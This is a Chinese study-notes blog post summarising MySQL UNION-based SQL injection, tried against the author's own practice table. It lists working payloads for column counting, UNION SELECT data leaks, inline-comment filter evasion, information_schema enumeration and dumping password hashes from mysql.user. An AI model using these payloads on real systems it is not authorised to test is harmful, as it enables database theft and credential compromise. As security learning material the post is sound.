---
layout: post
title: "4.MySQL UNION 注入小结"
subtitle: "4.MySQL UNION 注入小结"
date: 2019-08-11
author: ppbibo
category: 习信息安全系列
finished: true
---
[TOC]

```mysql
mysql> select * from users order by 3;
+----+-------------+---------+---------+------+--------+
| id | name        | chinese | english | math | Strong |
+----+-------------+---------+---------+------+--------+
|  6 | ZhangJinbao |      55 |      85 |   45 |     10 |
|  2 | LiJin       |      67 |      53 |   95 |     10 |
|  7 | HuangRong   |      75 |      65 |   30 |     10 |
|  5 | LiLaicai    |      82 |      84 |   67 |     10 |
|  3 | WangWu      |      87 |      78 |   77 |     10 |
|  4 | LiYi        |      88 |      98 |   92 |     10 |
|  1 | XiaoMing    |      89 |      78 |   90 |     10 |
+----+-------------+---------+---------+------+--------+
7 rows in set (0.00 sec)

```



**UNION 注入**



```mysql
SELECT * FROM users WHERE id = 1 ORDER BY 6;

SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3,4,5,6;

SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,version(),database(),5,6 FROM users #LIMIT 1;

```



**内联注释**



```mysql
SELECT * FROM users WHERE id = 1 /*!ORDER*/ BY/**/6;

SELECT * FROM users WHERE id = 1/*!*/UNION/**/SELECT 1,2,@@version,database/*asdasd*/(),5,6 FROM users #LIMIT 1;



SELECT * FROM users WHERE id = 0/*!*/OR 1 = 1 UNION/**/SELECT 1,2,@@version,database/*asdasd*/(),5,6 FROM users;
```





**解释**

ORDER BY 子句用来排序使用，**与主查询相匹配**。



**例如：**

```mysql
SELECT * FROM users WHERE id = 1 ORDER BY 6;
```

这里主查询是 `*` 就是所有列。



```mysql
SELECT name FROM users WHERE id = 1 ORDER BY 1;
```

这里查询的为 name  一个列，如果order by 2 报错提示未知列；

*/\*语句* *ERROR 1054 (42S22): Unknown column '2' in 'order clause’ 。\*/*



**查询 mysql 密码 (** 必须为ROOT权限，才可以进行跨裤操作 **)**

```mysql
SELECT host,user,authentication_string FROM mysql.user;   -- MYSQL 8.0

SELECT host,user,password FROM mysql.user;  -- MYSQL 5.5
```



**/\*获取当前用户可操作的数据库\*/**

```mysql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4,5,group_concat(schema_name) FROM information_schema.schemata;
```



**/\*获取指定数据库表名\*/**

```mysql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4,5,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='python';
```



**/\*获取指定表的列名\*/**

```mysql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4,5,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='python' AND TABLE_NAME='users';
```



**/\*获取指定列的内容\*/**

```mysql
SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4,name,Strong FROM users;
```



**Tips:**

​        *一般都是有 information_schema这个数据裤的，这个数据裤储存了当前用户的一些信息，数据库、数据表等信息。*



group_concat()，手册上说明:该函数返回带有来自一个组的连接的非NULL值的字符串结果。